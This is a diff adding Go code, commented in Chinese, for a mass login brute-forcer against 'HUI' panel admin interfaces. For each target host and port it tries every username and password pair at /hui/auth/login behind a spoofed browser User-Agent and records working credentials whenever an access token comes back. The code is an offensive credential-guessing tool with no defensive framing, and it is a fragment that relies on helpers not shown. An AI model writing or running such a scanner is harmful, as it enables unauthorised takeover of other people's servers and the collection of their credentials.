@@ -1,0 +1,76 @@
+// Handler: HUI 面板 (模式 3)
+// POST /hui/auth/login — application/json;charset=UTF-8
+// 响应: {"data": {"accessToken": "..."}}
+
+import (
+	"context"
+	"encoding/json"
+	"fmt"
+	"io"
+	"net/http"
+	"strings"
+	"time"
+)
+
+func postRequest(ctx context.Context, url string, username string, password string) (*http.Response, error) {
+	client := &http.Client{}
+	data := map[string]string{
+		"username": username,
+		"pass":     password,
+	}
+	jsonPayload, _ := json.Marshal(data)
+	req, err := http.NewRequest("POST", url, strings.NewReader(string(jsonPayload)))
+	if err != nil {
+		return nil, err
+	}
+	req.Header.Add("Content-Type", "application/json;charset=UTF-8")
+	req.Header.Add("Accept", "application/json, text/plain, */*")
+	req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0")
+	req = req.WithContext(ctx)
+	return client.Do(req)
+}
+
+func processIP(ipPort string, file *os.File, usernames []string, passwords []string) {
+	defer wg.Done()
+	semaphore <- struct{}{}
+	defer func() { <-semaphore }()
+
+	// 归一化: URL → host:port
+	ipPort = normalizeTarget(ipPort)
+
+	parts := strings.Split(ipPort, ":")
+	if len(parts) != 2 {
+		atomic.AddInt64(&completedCount, 1)
+		return
+	}
+	ip, port := parts[0], parts[1]
+
+	for _, username := range usernames {
+		for _, password := range passwords {
+			ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
+			url := fmt.Sprintf("http://%s:%s/hui/auth/login", ip, port)
+			resp, err := postRequest(ctx, url, username, password)
+			cancel()
+			if err != nil {
+				continue
+			}
+			if resp.StatusCode == http.StatusOK {
+				body, _ := io.ReadAll(resp.Body)
+				resp.Body.Close()
+				var responseData map[string]interface{}
+				if err := json.Unmarshal(body, &responseData); err == nil {
+					if data, ok := responseData["data"].(map[string]interface{}); ok {
+						if token, exists := data["accessToken"].(string); exists && token != "" {
+							writeResultToFile(file, fmt.Sprintf("%s:%s %s %s", ip, port, username, password))
+							atomic.AddInt64(&completedCount, 1)
+							return
+						}
+					}
+				}
+			} else {
+				resp.Body.Close()
+			}
+		}
+	}
+	atomic.AddInt64(&completedCount, 1)
+}
